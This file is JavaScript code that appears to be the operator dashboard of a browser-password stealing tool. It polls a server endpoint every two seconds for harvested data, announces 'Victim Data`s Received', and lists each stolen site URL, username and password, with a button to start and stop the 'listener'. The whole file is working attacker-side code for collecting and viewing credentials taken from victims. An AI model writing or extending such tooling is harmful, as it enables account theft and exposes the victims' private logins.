function Get_data() {
    $.post("browser-passwd/check_recv.php", {"data": "Send_Me_Data"}, function(data) {
        
        if (data == "Data isn't Exist :/") {
            console.log("🤔")
        } else {
            $("#notif").text("Victim Data`s Received 👍")
            obj = JSON.parse(data)

            for (i of obj) {
                $("#result").append("url : " + i['url'])
                $("#result").append("\nusername : " + i['username'])
                $("#result").append("\npassword : " + i['password'])
                $("#result").append("\n--------------------------------\n")
            }

        }


    })

}


timer = setInterval(Get_data, 2000)


$("#btn-listen").click(function(){

    if($("#btn-listen").text() == "Listener Runing / press to stop"){
        clearInterval(timer)
        console.log("stoped listener")
        $("#btn-listen").text("Listener stoped / press to start")
        $("#btn-listen").attr("class","btn btn-danger m-2")



    }else{
        
        timer = setInterval(Get_data,2000)
        console.log("started listener")
        $("#btn-listen").text("Listener Runing / press to stop")
        $("#btn-listen").attr("class","btn btn-primary m-2")
    }
    

})